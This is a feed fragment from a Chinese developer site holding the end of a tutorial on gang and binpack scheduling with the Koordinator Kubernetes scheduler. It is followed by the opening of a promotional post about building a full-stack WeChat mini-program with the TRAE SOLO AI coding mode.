        <span class="hljs-attr">app:</span> <span class="hljs-string">vgpu-job</span>
    <span class="hljs-attr">spec:</span>
      <span class="hljs-attr">containers:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">image:</span> <span class="hljs-string">busybox</span>
        <span class="hljs-attr">imagePullPolicy:</span> <span class="hljs-string">IfNotPresent</span>
        <span class="hljs-attr">name:</span> <span class="hljs-string">curlimage</span>
        <span class="hljs-attr">command:</span>
        <span class="hljs-bullet">-</span> <span class="hljs-string">sleep</span>
        <span class="hljs-bullet">-</span> <span class="hljs-string">365d</span>
        <span class="hljs-attr">resources:</span>
          <span class="hljs-attr">limits:</span>
            <span class="hljs-attr">cpu:</span> <span class="hljs-string">40m</span>
            <span class="hljs-attr">memory:</span> <span class="hljs-string">40Mi</span>
            <span class="hljs-attr">example.com/dongle:</span> <span class="hljs-number">2</span>
          <span class="hljs-attr">requests:</span>
            <span class="hljs-attr">cpu:</span> <span class="hljs-string">40m</span>
            <span class="hljs-attr">memory:</span> <span class="hljs-string">40Mi</span>
            <span class="hljs-attr">example.com/dongle:</span> <span class="hljs-number">2</span> 
</code></pre>
<p>每个pod申请2卡<code>example.com/dongle</code>资源，默认调度器的输出：启动的2pod均匀分布到2个worker节点</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9e2263f8893d427281375257bb9c2efa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyJ5oCB5bqm55qE5LiL562J6ams:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765519202&amp;x-signature=nfF5Vmu1naa5BxPskgL3pnEPdWk%3D" alt="" loading="lazy"/>
按照上面的理论，再申请8卡资源会受限。</p>
<p>本地为不影响原生调度器的能力，将koordinator作为第二套调度器。</p>
<h3 data-id="heading-7">3.2 gang scheduling</h3>
<p>koordinator支持gang scheduling 可使用crd或者注解的方式，这里我们使用crd：</p>
<p>该任务要求3pod，形成组调度：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># pg.deploy.yaml</span>
<span class="hljs-attr">apiVersion:</span> <span class="hljs-string">scheduling.sigs.k8s.io/v1alpha1</span>
<span class="hljs-attr">kind:</span> <span class="hljs-string">PodGroup</span>
<span class="hljs-attr">metadata:</span>
  <span class="hljs-attr">name:</span> <span class="hljs-string">gang-example</span>
  <span class="hljs-attr">namespace:</span> <span class="hljs-string">default</span>
<span class="hljs-attr">spec:</span>
  <span class="hljs-attr">scheduleTimeoutSeconds:</span> <span class="hljs-number">10</span>
  <span class="hljs-attr">minMember:</span> <span class="hljs-number">3</span>
</code></pre>
<p>修改业务manifest文件，指定<code>koord-scheduler</code>调度器和gang scheduling规格对象标签。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f2b151a553ce47f7a970dd58691aa6a7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyJ5oCB5bqm55qE5LiL562J6ams:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765519202&amp;x-signature=a%2FKGjkrja%2FZJeTIBIGMvaw2UGqg%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-8">3.3 binpack</h3>
<p>koordinator有<a href="https://link.juejin.cn?target=https%3A%2F%2Fkoordinator.sh%2Fzh-Hans%2Fdocs%2Fuser-manuals%2Fnode-resource-fit-plus-scoring" title="https://koordinator.sh/zh-Hans/docs/user-manuals/node-resource-fit-plus-scoring" target="_blank" ref="nofollow noopener noreferrer">NodeResourcesFitPlus插件</a> 来做binpack调度。</p>
<p>本例模拟节点上GPU的分配，希望将应用都binpack到一个节点上，而不是均分到多个节点，那么对于资源<code>example.com/dongle</code>的权重要设高。<br/>
修改koordinator的NodeResourcesFitPlus插件配置：</p>
<blockquote>
<p>!!! 以helm方式安装的Koordinator的，对外没有修改插件配置的入口。<br/>
本次拉取helm chart到本地，对<code>template/koord-scheduler-config.yaml</code>新增了插件配置，切记不要用红框内容完全替换文件，而是拿下面的配置patch到文件。<br/>
helm upgrade koordinator ./<br/>
kubectl  rollout restart deploy/koord-scheduler -n koordinator-system</p>
</blockquote>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6f369b2d2ed044a481f1d47e98322e0e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyJ5oCB5bqm55qE5LiL562J6ams:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765519202&amp;x-signature=YojZiL26%2B8MYf1MefF5Vv2uiT7s%3D" alt="" loading="lazy"/></p>
<p>插件NodeResourcesFitPlus两种策略的评分计算方法和效果如下：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d75b7a9430654918b73460016dd84e45~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyJ5oCB5bqm55qE5LiL562J6ams:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765519202&amp;x-signature=eFvZZKpVtbDa03I1AcazDeUACsY%3D" alt="" loading="lazy"/></p>
<p>最终的节点评分可以按如下方式计算：</p>
<p><code>finalScoreNode = [(weight1 * resource1) + (weight2 * resource2) + … + (weightN* resourceN)] /(weight1+weight2+ … +weightN)</code></p>
<p>那么节点的打分：</p>
<p>nodeScore =  (20* MostAllocatedAlg + 2* LeastAllocatedAlg + 1* LeastAllocatedAlg  )/（20+2+1），</p>
<p>粗略想象在第一个Pod被调度到节点A之后， 调度第二个Pod时， 节点A的MostAllocatedAlg = 2/6， 而节点B的MostAllocatedAlg = 2/8,  20的权重值在分子端占据更大因素，故第二个Pod也会更倾向于调度到节点A， 这样算法就做到了binpack。</p>
<hr/>
<p>到这里条件就都就绪了:
2台节点（均有8卡资源），每个Pod占用2卡资源，要求3 Pod形成组调度，且要求是binpack调度。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/23dd0545478b4eb89af27958e05bb658~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyJ5oCB5bqm55qE5LiL562J6ams:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765519202&amp;x-signature=0HiASU8WU9sbhtOrhMKXctoaBK4%3D" alt="" loading="lazy"/></p>
<p>验证有效，目前3Pod占用了minikube-m03节点上6卡资源，继续扩容到5 Pod，理论上会有一个Pod调度到另外一个worker节点。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0490d25c382d417582d7084b237780a6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyJ5oCB5bqm55qE5LiL562J6ams:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765519202&amp;x-signature=Rp6c2jiz56%2FQJ9FpxD64ga%2F1Guc%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-9">总结</h2>
<p>本文回顾了在云原生背景下AIops 与原生k8s调度器的格格不入。</p>
<p>演示了开源的koordinator调度器是如何支持AIOps场景下的gang-scheduling 和binpack调度。</p>
<p>gang-scheduling 聚焦于k8s集群中上层批处理作业要求的Pod协作能力。</p>
<p>binpack 聚焦于k8s集群中作为基础设施节点的资源利用率，binpack会避免打散，尽量留出空闲节点。</p>
<p>本文文字和制图均为原创，特别是binpack的验证耗费了博主1个星期的倒腾时间， 期待一键三连，交个朋友， 35+报团不迷路。🎨🎨</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[【AI 编程实战】第 1 篇：TRAE SOLO 模式 10 倍速开发商业级全栈小程序]]></title>    <link>https://juejin.cn/post/7579892222609391651</link>    <guid>https://juejin.cn/post/7579892222609391651</guid>    <pubDate>2025-12-05T04:15:06.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579892222609391651" data-draft-id="7579813945601065000" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="【AI 编程实战】第 1 篇：TRAE SOLO 模式 10 倍速开发商业级全栈小程序"/> <meta itemprop="keywords" content="前端,后端,AI编程"/> <meta itemprop="datePublished" content="2025-12-05T04:15:06.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="HashTang"/> <meta itemprop="url" content="https://juejin.cn/user/1117561754756488"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            【AI 编程实战】第 1 篇：TRAE SOLO 模式 10 倍速开发商业级全栈小程序
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1117561754756488/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    HashTang
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T04:15:06.000Z" title="Fri Dec 05 2025 04:15:06 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    10
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读12分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{position:relative;word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#333}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:30px;margin-bottom:5px}.markdown-body h2{font-size:24px;display:inline-block;font-weight:700;background:#ef7060;color:#fff;padding:6px 8px 0 0;border-top-right-radius:6px;margin-right:2px;box-shadow:6px 3px 0 0 rgba(239,112,96,.2)}.markdown-body h2:before{content:" ";display:inline-block;width:8px}.markdown-body h2:after{content:" ";position:absolute;display:block;width:calc(100% - 50px);border-bottom:3px solid #ef7060}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #3e3e3e;margin-top:32px;margin-bottom:32px;height:1px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:rgba(27,31,35,.05);color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:JetBranins Mono,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;box-shadow:0 0 8px hsla(0,0%,43.1%,.45);border-radius:4px;margin:16px}.markdown-body pre:before{content:"";display:block;height:30px;width:100%;margin-bottom:-7px;background:url(data:image/png;base64,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) 10px 10px no-repeat;background-size:40px;background-color:#fdfdfd}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#fdfdfd}.markdown-body a{text-decoration:none;font-weight:700;color:#ef7060;border-bottom:1px solid #ef7060}.markdown-body a:active,.markdown-body a:hover{color:#ef2d26}.markdown-body table tr td,.markdown-body table tr th{border:1px solid #ccc;padding:5px 10px}.markdown-body table{display:block!important;width:auto;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{background:#f0f0f0;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#f8f8f8}.markdown-body blockquote{margin-inline-start:0;margin-inline-end:0;border-left:3px solid #ef7060;background:#fff9f9;padding:1px 20px;margin-top:20px}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="vs2015">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#1e1e1e;color:#dcdcdc}.hljs-keyword,.hljs-link,.hljs-literal,.hljs-name,.hljs-symbol{color:#569cd6}.hljs-link{text-decoration:underline}.hljs-built_in,.hljs-type{color:#4ec9b0}.hljs-class,.hljs-number{color:#b8d7a3}.hljs-meta-string,.hljs-string{color:#d69d85}.hljs-regexp,.hljs-template-tag{color:#9a5334}.hljs-formula,.hljs-function,.hljs-params,.hljs-subst,.hljs-title{color:#dcdcdc}.hljs-comment,.hljs-quote{color:#57a64a;font-style:italic}.hljs-doctag{color:#608b4e}.hljs-meta,.hljs-meta-keyword,.hljs-tag{color:#9b9b9b}.hljs-template-variable,.hljs-variable{color:#bd63c5}.hljs-attr,.hljs-attribute,.hljs-builtin-name{color:#9cdcfe}.hljs-section{color:gold}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-bullet,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-id,.hljs-selector-pseudo,.hljs-selector-tag{color:#d7ba7d}.hljs-addition{background-color:#144212}.hljs-addition,.hljs-deletion{display:inline-block;width:100%}.hljs-deletion{background-color:#600}</style><blockquote>
<p>从 2 个月到 2 周，从连滚带爬到游刃有余，AI 编程正在改变我们的开发方式。这是《<a href="https://juejin.cn/column/7579556047783624756" target="_blank" title="https://juejin.cn/column/7579556047783624756">AI 编程实战：TRAE SOLO 全栈开发指南</a>》专栏的第一篇文章，欢迎关注，不错过每一篇文章的更新。相信我，你会从这篇文章开始，体验到 AI 编程的乐趣，感受到零手写代码就能开发商业级项目的便捷。</p>
</blockquote>
<h2 data-id="heading-0">一、你还在为项目进度焦虑吗？</h2>
<p>上周，我的朋友小何找到我，一脸愁容。他接了一个恋爱话术回复类的小程序项目——"心动恋聊"，需要在 2 个月内完成从 0 到 1 的开发。看着需求文档上密密麻麻的功能点，他开始掰着手指算时间：</p>
<ul>
<li>项目架构搭建：至少 2 天</li>
<li>前端页面开发：20 个页面 × 1 天 = 20 天</li>
<li>后端 API 开发：30 个接口 × 半天 = 15 天</li>
<li>登录鉴权、状态管理、HTTP 封装：3 天</li>
<li>代码规范配置：1 天</li>
<li>Bug 修复和优化：预留 10 天</li>
<li>CI/CD 部署配置：2 天</li>
</ul>
<p>粗略一算，<strong>53 天</strong>，还没算上需求变更和各种意外情况。2 个月的工期根本不够用！</p>
<p>一周后，我再见到小何，他却一脸轻松。"怎么样，进度还好吗？" 我关心地问。</p>
<p>"已经完成 80% 了，" 他笑着说，"用了 TRAE SOLO 模式，效率简直爆表！"</p>
<p>这不是魔法，这是 AI 辅助开发的真实效果。</p>
<p><strong>2 个月的工作量，2 周完成</strong>。这不是夸张，这是我亲眼见证的真实案例，目前已经上线，大家感兴趣的可以搜索体验。</p>
<h3 data-id="heading-1">效果预览</h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ac66ec10cb77431298f8ba34ff504eef~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSGFzaFRhbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765513958&amp;x-signature=eBUoI356OqH%2Ff81YJ4AzSr6sof0%3D" alt="产品首页图.jpg" loading="lazy"/></p>
<h2 data-id="heading-2">二、TRAE SOLO 模式：你的全栈开发伙伴</h2>
<h3 data-id="heading-3">2.1 这不是又一个代码补全工具</h3>
<p>说到 AI 编程工具，你可能第一时间想到 GitHub Copilot。没错，Copilot 很好用，但它更像一个"代码补全助手"——你写前半句，它帮你补全后半句。还有人会说 Claude code，没错，它确实是最顶尖的 AI 编程工具，但是不上点特殊手段用不了。</p>
<p>而 TRAE SOLO 模式，是完全不同的存在。</p>
<p>如果说 Copilot 是一个会预测你下一句话的助手，那么 TRAE SOLO 就是一个<strong>能独立思考、主动决策的全栈开发伙伴</strong>。</p>
<p>想象一下这个场景：</p>
<p><strong>传统开发</strong>：</p>
<pre><code class="hljs language-erlang" lang="erlang">你：我需要实现用户登录
你：先查微信小程序登录文档...
你：再查 Next.js API 文档...
你：JWT 怎么用来着？搜一下...
你：前端怎么存 Token？想想...
你：代码写完了，自己审查一遍...
你：手动写测试用例...
</code></pre>
<p><strong>TRAE SOLO 模式</strong>：</p>
<pre><code class="hljs language-vbnet" lang="vbnet">你：帮我实现微信小程序的用户登录功能

AI：好的，我来处理：
  ✓ 分析项目结构（识别到 UniApp + <span class="hljs-keyword">Next</span>.js）
  ✓ 设计登录流程（包括前后端交互）
  ✓ 生成前端登录页面（Vue3 + UView Pro）
  ✓ 生成后端 API（<span class="hljs-keyword">Next</span>.js Route Handlers）
  ✓ 实现 JWT Token 管理
  ✓ 添加 TypeScript 类型定义
  ✓ 代码审查优化
  ✓ 生成测试用例

<span class="hljs-number">3</span> 小时后，完整的登录系统已经可以运行了。
</code></pre>
<p>看出区别了吗？<strong>你从"亲力亲为"变成了"委托执行"</strong>。</p>
<h2 data-id="heading-4">三、真实项目案例：心动恋聊小程序</h2>
<p>让我详细讲讲小何的"心动恋聊"项目，看看 AI 辅助开发在真实项目中的效果。</p>
<h3 data-id="heading-5">3.1 项目背景</h3>
<p><strong>项目定位</strong>：一款面向年轻人的恋爱话术回复小程序，帮助用户高情商聊天、轻松接话。</p>
<p><strong>技术选型</strong>：</p>
<ul>
<li><strong>前端</strong>：UniApp + Vue3 + TypeScript + UnoCSS + Pinia</li>
<li><strong>后端</strong>：Next.js 15 + Prisma + PostgreSQL</li>
<li><strong>架构</strong>：Monorepo（pnpm + Turborepo）</li>
<li><strong>工程化</strong>：ESLint + Prettier + Husky + GitHub Actions</li>
</ul>
<p><strong>多平台规划</strong>（这是重点！）：</p>
<pre><code class="hljs language-css" lang="css">第一阶段：微信小程序（快速验证市场）
第二阶段：<span class="hljs-selector-tag">H5</span> 版本（扩大覆盖面）
第三阶段：鸿蒙应用（抓住新机遇）
第四阶段：安卓 App（深度用户）
第五阶段：iOS App（完整生态）
</code></pre>
<p><strong>一套代码，五端发布</strong>。这就是 UniApp 的魅力，也是为什么选择它的原因。</p>
<h3 data-id="heading-6">3.2 代码质量对比</h3>
<p>让小何惊喜的是，AI 生成的代码质量非常高：</p>
<p><strong>架构设计</strong>：</p>
<ul>
<li>✓ 标准的 Monorepo 结构</li>
<li>✓ 清晰的分包策略</li>
<li>✓ 合理的代码复用</li>
</ul>
<p><strong>类型安全</strong>：</p>
<ul>
<li>✓ 100% TypeScript 覆盖</li>
<li>✓ 前后端类型共享（shared-types 包）</li>
<li>✓ 完整的类型推导</li>
</ul>
<p><strong>工程化水平</strong>：</p>
<ul>
<li>✓ ESLint + Prettier 自动格式化</li>
<li>✓ Git Hooks 自动检查</li>
<li>✓ CI/CD 自动化部署</li>
</ul>
<p><strong>代码规范</strong>：</p>
<ul>
<li>✓ 统一的命名规范</li>
<li>✓ 清晰的注释</li>
<li>✓ 符合最佳实践</li>
</ul>
<p>小何说："AI 生成的代码，比我自己写的还要规范。"</p>
<h2 data-id="heading-7">四、AI 能在哪些方面提升你的效率？</h2>
<p>让我们深入看看，AI 到底能在哪些具体环节帮到你。</p>
<h3 data-id="heading-8">4.1 架构设计：从零经验到专家级</h3>
<p><strong>传统方式</strong>：</p>
<ul>
<li>搜索"Monorepo 最佳实践"</li>
<li>看各种博客文章</li>
<li>试错、调整、再试错</li>
</ul>
<p><strong>AI 辅助</strong>：</p>
<pre><code class="hljs language-markdown" lang="markdown">你：帮我设计一个包含小程序端和服务端的 Monorepo 项目结构

AI：为你设计了这样的结构：
  packages/
  ├── apps/
  │   ├── unibest-mp/          # UniApp 小程序
  │   └── xindong-server/     # Next.js 服务端
  ├── packages/
  │   └── shared-types/        # 共享类型定义
  ├── pnpm-workspace.yaml
  ├── turbo.json
  └── package.json

  这个结构的优势：
<span class="hljs-bullet">  1.</span> 前后端代码隔离，便于独立开发
<span class="hljs-bullet">  2.</span> 共享类型包确保接口一致性
<span class="hljs-bullet">  3.</span> Turborepo 并行构建，提升效率
<span class="hljs-bullet">  4.</span> pnpm 节省磁盘空间和安装时间
</code></pre>
<p><strong>案例</strong>：配置 Turborepo 任务编排</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"pipeline"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"build"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"dependsOn"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"^build"</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"outputs"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"dist/**"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">".next/**"</span><span class="hljs-punctuation">]</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"dev"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"cache"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"persistent"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
